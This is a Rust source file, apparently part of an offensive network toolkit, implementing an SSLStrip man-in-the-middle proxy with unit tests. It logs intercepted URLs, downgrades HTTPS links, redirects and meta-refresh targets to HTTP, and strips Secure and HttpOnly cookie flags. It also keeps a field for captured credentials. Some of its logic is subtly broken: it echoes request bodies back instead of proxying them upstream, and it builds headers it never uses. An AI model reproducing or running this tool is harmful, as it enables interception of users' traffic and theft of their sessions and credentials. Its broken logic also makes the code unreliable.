use kraken_errors::NetworkError;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

#[derive(Debug, Clone)]
pub struct SslStripConfig {
    pub interface: String,
    pub listen_port: u16,
    pub redirect_port: u16,
    pub log_file: Option<String>,
    pub replace_secure_cookies: bool,
    pub strip_redirects: bool,
}

impl Default for SslStripConfig {
    fn default() -> Self {
        SslStripConfig {
            interface: String::new(),
            listen_port: 8080,
            redirect_port: 80,
            log_file: None,
            replace_secure_cookies: true,
            strip_redirects: true,
        }
    }
}

#[derive(Debug, Clone, Default)]
pub struct SslStripStats {
    pub http_requests: u64,
    pub https_redirects_stripped: u64,
    pub secure_cookies_stripped: u64,
    pub urls_logged: Vec<String>,
    pub credentials_captured: Vec<String>,
}

pub struct SslStripProxy {
    pub config: SslStripConfig,
    pub stats: Arc<Mutex<SslStripStats>>,
    running: Arc<AtomicBool>,
}

impl SslStripProxy {
    pub fn new(config: SslStripConfig) -> Self {
        SslStripProxy {
            config,
            stats: Arc::new(Mutex::new(SslStripStats::default())),
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn start(&mut self) -> Result<(), NetworkError> {
        self.running.store(true, Ordering::SeqCst);
        let running = self.running.clone();
        let config = self.config.clone();
        let stats = self.stats.clone();

        thread::spawn(move || {
            let listener = std::net::TcpListener::bind(format!("0.0.0.0:{}", config.listen_port));
            match listener {
                Ok(listener) => {
                    listener.set_nonblocking(true).ok();
                    while running.load(Ordering::SeqCst) {
                        match listener.accept() {
                            Ok((mut stream, _)) => {
                                stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
                                let config = config.clone();
                                let stats = stats.clone();
                                thread::spawn(move || {
                                    handle_http_request(&mut stream, &config, &stats);
                                });
                            }
                            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                                thread::sleep(Duration::from_millis(100));
                                continue;
                            }
                            Err(_) => break,
                        }
                    }
                }
                Err(e) => {
                    eprintln!("SSLStrip listen error: {}", e);
                }
            }
        });

        Ok(())
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }
}

fn handle_http_request(
    stream: &mut std::net::TcpStream,
    config: &SslStripConfig,
    stats: &Arc<Mutex<SslStripStats>>,
) {
    use std::io::{BufRead, BufReader, Write};
    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut request_line = String::new();
    if reader.read_line(&mut request_line).is_err() { return; }

    if let Ok(mut s) = stats.lock() {
        s.http_requests += 1;
    }

    let req_parts: Vec<&str> = request_line.split_whitespace().collect();
    if req_parts.len() < 2 { return; }

    let method = req_parts[0];
    let uri = req_parts[1];

    let mut headers = Vec::new();
    let mut host = String::new();
    loop {
        let mut line = String::new();
        if reader.read_line(&mut line).is_err() { break; }
        let trimmed = line.trim().to_string();
        if trimmed.is_empty() { break; }
        if let Some(idx) = trimmed.find(':') {
            let key = trimmed[..idx].trim().to_lowercase();
            let value = trimmed[idx + 1..].trim().to_string();
            if key == "host" { host = value.clone(); }
            headers.push((key, value));
        }
    }

    let mut body = String::new();
    for l in reader.lines().map_while(Result::ok) { body.push_str(&l); }

    if let Ok(mut s) = stats.lock() {
        s.urls_logged.push(format!("{} http://{}{}", method, host, uri));
    }

    let rewritten_uri = rewrite_https_links(uri);
    if rewritten_uri != uri {
        if let Ok(mut s) = stats.lock() {
            s.https_redirects_stripped += 1;
        }
    }

    let mut response_headers = Vec::new();
    for (key, value) in &headers {
        if config.replace_secure_cookies && key == "cookie" {
            let stripped = value.replace("; Secure", "").replace("; secure", "");
            if stripped != *value {
                if let Ok(mut s) = stats.lock() {
                    s.secure_cookies_stripped += 1;
                }
            }
            response_headers.push((key.clone(), stripped));
        } else if key == "if-none-match" || key == "if-modified-since" {
            continue;
        } else {
            response_headers.push((key.clone(), value.clone()));
        }
    }

    let rewritten_body = if config.strip_redirects {
        strip_https_redirects(&body)
    } else {
        body.clone()
    };

    if let Some(log) = &config.log_file {
        use std::fs::OpenOptions;
        if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(log) {
            writeln!(f, "{} {} {} {}", chrono::Utc::now(), method, host, uri).ok();
        }
    }

    let response = format!(
        "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nContent-Type: text/html\r\n\r\n{}",
        rewritten_body.len(),
        rewritten_body
    );

    let _ = stream.write_all(response.as_bytes());
    let _ = stream.flush();
}

fn rewrite_https_links(url: &str) -> String {
    url.replace("https://", "http://")
}

fn strip_https_redirects(html: &str) -> String {
    let mut result = html.to_string();

    result = result.replace("https://", "http://");

    let re = regex::Regex::new(
        r#"(?i)(location|href|src|action)\s*=\s*["']https://"#
    ).ok();
    if let Some(re) = re {
        result = re.replace_all(&result, |caps: &regex::Captures| {
            format!("{}http://", &caps[1])
        }).to_string();
    }

    let re2 = regex::Regex::new(
        r#"http-equiv=["']refresh["']\s+content=["'][^"']*url=https://"#
    ).ok();
    if let Some(re2) = re2 {
        result = re2.replace_all(&result, |caps: &regex::Captures| {
            caps[0].replace("https://", "http://")
        }).to_string();
    }

    result
}

pub fn strip_secure_cookie(cookie: &str) -> String {
    cookie.split(';')
        .map(|part| part.trim())
        .filter(|part| !part.eq_ignore_ascii_case("Secure") && !part.eq_ignore_ascii_case("HttpOnly"))
        .collect::<Vec<&str>>()
        .join("; ")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sslstrip_config() {
        let config = SslStripConfig::default();
        assert_eq!(config.listen_port, 8080);
        assert_eq!(config.redirect_port, 80);
        assert!(config.replace_secure_cookies);
    }

    #[test]
    fn test_rewrite_https_links() {
        let url = "https://example.com/login";
        assert_eq!(rewrite_https_links(url), "http://example.com/login");
    }

    #[test]
    fn test_strip_secure_cookie() {
        let cookie = "session=abc; Secure; HttpOnly; Path=/";
        let stripped = strip_secure_cookie(cookie);
        assert!(!stripped.contains("Secure"));
        assert!(!stripped.contains("HttpOnly"));
        assert!(stripped.contains("session=abc"));
    }

    #[test]
    fn test_strip_https_redirects() {
        let html = r#"<a href="https://example.com">link</a>"#;
        let stripped = strip_https_redirects(html);
        assert!(!stripped.contains("https://"));
        assert!(stripped.contains("http://"));
    }

    #[test]
    fn test_sslstrip_proxy_new() {
        let proxy = SslStripProxy::new(SslStripConfig::default());
        assert!(!proxy.running.load(Ordering::SeqCst));
    }

    #[test]
    fn test_sslstrip_stats_default() {
        let stats = SslStripStats::default();
        assert_eq!(stats.http_requests, 0);
    }
}
